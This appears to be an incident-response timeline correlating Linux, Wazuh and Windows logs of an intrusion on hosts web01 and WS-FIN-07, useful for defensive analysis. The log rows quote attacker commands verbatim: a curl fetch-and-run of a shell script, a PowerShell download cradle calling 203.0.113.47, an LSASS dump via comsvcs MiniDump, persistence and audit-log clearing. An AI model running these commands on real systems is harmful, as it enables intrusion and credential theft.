# Incident Timeline

- **Window:** 2026-09-29 09:58:12 → 2026-09-29 10:46:11 UTC
- **Events:** 31 (Linux: 9, Wazuh: 7, Windows: 15)
- **Severity:** CRITICAL 3, HIGH 12, MEDIUM 8, LOW 5, INFO 3
- **Hosts:** WS-FIN-07, web01
- **ATT&CK techniques observed:** T1003.001, T1021, T1021.002, T1021.004, T1027, T1053.005, T1059, T1059.001, T1059.004, T1070.001, T1071, T1078, T1087, T1098, T1098.004, T1105, T1110, T1136, T1136.001, T1543.003, T1548.003, T1564.003, T1569.002

## Key events

- `10:34:05` **Linux/web01**: SSH login accepted: deploy from 203.0.113.47 (password) - after 14 failed attempts from this IP
- `10:36:03` **Linux/web01**: User sysupdate added to group sudo  [privileged group]
- `10:37:15` **Linux/web01**: sudo: deploy ran as root: /usr/bin/tee -a /root/.ssh/authorized_keys  [SSH key persistence]
- `10:42:11` **Windows/WS-FIN-07**: Successful logon: CORP\svc_backup (type 3 Network) from 10.0.5.20 [web01] via NTLM - after 6 failed attempts from this IP
- `10:42:17` **Windows/WS-FIN-07**: Service installed: BTOBTO -> %COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat (demand start)  [suspicious service - remote execution tooling?]
- `10:42:19` **Windows/WS-FIN-07**: Process powershell.exe (parent cmd.exe): powershell.exe -nop -w hidden -enc <200 chars base64> \| decoded: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')  [encoded PowerShell, hidden window, Invoke-Expression, download cradle]
- `10:42:21` **Windows/WS-FIN-07**: PowerShell script block: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')  [Invoke-Expression, download cradle, flagged by PowerShell]
- `10:42:23` **Windows/WS-FIN-07**: Network connection: powershell.exe -> 203.0.113.47:443  [scripting/LOLBin process to external host - possible C2]
- `10:42:25` **Wazuh/WS-FIN-07**: Powershell.exe spawned with a base64 encoded command
- `10:43:48` **Windows/WS-FIN-07**: Process rundll32.exe (parent powershell.exe): rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\lsass.dmp full  [LSASS dump via comsvcs]
- `10:43:48` **Windows/WS-FIN-07**: LSASS memory access by rundll32.exe (GrantedAccess 0x1FFFFF)  [credential dumping?]
- `10:43:50` **Wazuh/WS-FIN-07**: Possible LSASS memory dump via comsvcs.dll MiniDump
- `10:44:30` **Windows/WS-FIN-07**: Scheduled task created: \Microsoft\Windows\Maintenance\SysUpdate -> powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')"  [Invoke-Expression, download cradle, hidden window]
- `10:46:10` **Windows/WS-FIN-07**: Security audit log cleared by CORP\svc_backup
- `10:46:11` **Wazuh/WS-FIN-07**: The audit log was cleared (user=svc_backup)

## Full timeline

| Time (UTC) | Source | Host | Code | Severity | Summary |
|---|---|---|---|---|---|
| 2026-09-29 09:58:12 | Windows | WS-FIN-07 | 4624 | INFO | Successful logon: CORP\jsmith (type 2 Interactive) [WS-FIN-07] via Negotiate |
| 2026-09-29 10:24:44 | Linux | web01 | sshd | LOW | SSH login accepted: alice from 10.0.5.10 (publickey) |
| 2026-09-29 10:31:02 | Linux | web01 | sshd | MEDIUM | SSH brute force: 14 failed logons from 203.0.113.47 (10:31:02-10:33:40) targeting 6 account(s): admin, deploy, git, oracle, root ... |
| 2026-09-29 10:33:41 | Wazuh | web01 | 5712 | MEDIUM | sshd: brute force trying to get access to the system. Authentication failed. (src=203.0.113.47) |
| 2026-09-29 10:34:05 | Linux | web01 | sshd | **HIGH** | SSH login accepted: deploy from 203.0.113.47 (password) - after 14 failed attempts from this IP |
| 2026-09-29 10:34:06 | Wazuh | web01 | 5715 | INFO | sshd: authentication success. (user=deploy, src=203.0.113.47) |
| 2026-09-29 10:35:12 | Linux | web01 | sudo | MEDIUM | sudo: deploy ran as root: /usr/bin/curl -s http://203.0.113.47/x.sh -o /tmp/.x.sh  [file download, execution from world-writable directory] |
| 2026-09-29 10:35:30 | Linux | web01 | sudo | MEDIUM | sudo: deploy ran as root: /bin/bash /tmp/.x.sh  [execution from world-writable directory] |
| 2026-09-29 10:36:01 | Linux | web01 | useradd | MEDIUM | User account created: sysupdate (UID 1002, shell /bin/bash) |
| 2026-09-29 10:36:02 | Wazuh | web01 | 5902 | MEDIUM | New user added to the system. (user=sysupdate) |
| 2026-09-29 10:36:03 | Linux | web01 | usermod | **HIGH** | User sysupdate added to group sudo  [privileged group] |
| 2026-09-29 10:36:40 | Linux | web01 | passwd | LOW | Password changed for sysupdate |
| 2026-09-29 10:37:15 | Linux | web01 | sudo | **HIGH** | sudo: deploy ran as root: /usr/bin/tee -a /root/.ssh/authorized_keys  [SSH key persistence] |
| 2026-09-29 10:41:30 | Windows | WS-FIN-07 | 4625 | MEDIUM | Logon brute force: 6 failed logons from 10.0.5.20 (10:41:30-10:41:55) targeting 2 account(s): CORP\administrator, CORP\svc_backup |
| 2026-09-29 10:42:11 | Windows | WS-FIN-07 | 4624 | **HIGH** | Successful logon: CORP\svc_backup (type 3 Network) from 10.0.5.20 [web01] via NTLM - after 6 failed attempts from this IP |
| 2026-09-29 10:42:11 | Windows | WS-FIN-07 | 4672 | INFO | Admin-equivalent privileges assigned to CORP\svc_backup |
| 2026-09-29 10:42:15 | Windows | WS-FIN-07 | 5140 | MEDIUM | Network share \\*\ADMIN$ accessed by CORP\svc_backup from 10.0.5.20 |
| 2026-09-29 10:42:17 | Windows | WS-FIN-07 | 7045 | **HIGH** | Service installed: BTOBTO -> %COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat (demand start)  [suspicious service - remote execution tooling?] |
| 2026-09-29 10:42:18 | Wazuh | WS-FIN-07 | 61138 | LOW | New Windows Service Created |
| 2026-09-29 10:42:19 | Windows | WS-FIN-07 | 4688 | **HIGH** | Process powershell.exe (parent cmd.exe): powershell.exe -nop -w hidden -enc <200 chars base64> \| decoded: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')  [encoded PowerShell, hidden window, Invoke-Expression, download cradle] |
| 2026-09-29 10:42:21 | Windows | WS-FIN-07 | 4104 | **HIGH** | PowerShell script block: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')  [Invoke-Expression, download cradle, flagged by PowerShell] |
| 2026-09-29 10:42:23 | Windows | WS-FIN-07 | 3 | **HIGH** | Network connection: powershell.exe -> 203.0.113.47:443  [scripting/LOLBin process to external host - possible C2] |
| 2026-09-29 10:42:25 | Wazuh | WS-FIN-07 | 92057 | **HIGH** | Powershell.exe spawned with a base64 encoded command |
| 2026-09-29 10:43:02 | Windows | WS-FIN-07 | 4688 | LOW | Process whoami.exe (parent powershell.exe): whoami /all  [discovery command] |
| 2026-09-29 10:43:05 | Windows | WS-FIN-07 | 4688 | LOW | Process net.exe (parent powershell.exe): net group "Domain Admins" /domain  [discovery command] |
| 2026-09-29 10:43:48 | Windows | WS-FIN-07 | 4688 | **CRITICAL** | Process rundll32.exe (parent powershell.exe): rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\lsass.dmp full  [LSASS dump via comsvcs] |
| 2026-09-29 10:43:48 | Windows | WS-FIN-07 | 10 | **CRITICAL** | LSASS memory access by rundll32.exe (GrantedAccess 0x1FFFFF)  [credential dumping?] |
| 2026-09-29 10:43:50 | Wazuh | WS-FIN-07 | 92900 | **CRITICAL** | Possible LSASS memory dump via comsvcs.dll MiniDump |
| 2026-09-29 10:44:30 | Windows | WS-FIN-07 | 4698 | **HIGH** | Scheduled task created: \Microsoft\Windows\Maintenance\SysUpdate -> powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')"  [Invoke-Expression, download cradle, hidden window] |
| 2026-09-29 10:46:10 | Windows | WS-FIN-07 | 1102 | **HIGH** | Security audit log cleared by CORP\svc_backup |
| 2026-09-29 10:46:11 | Wazuh | WS-FIN-07 | 63103 | **HIGH** | The audit log was cleared (user=svc_backup) |
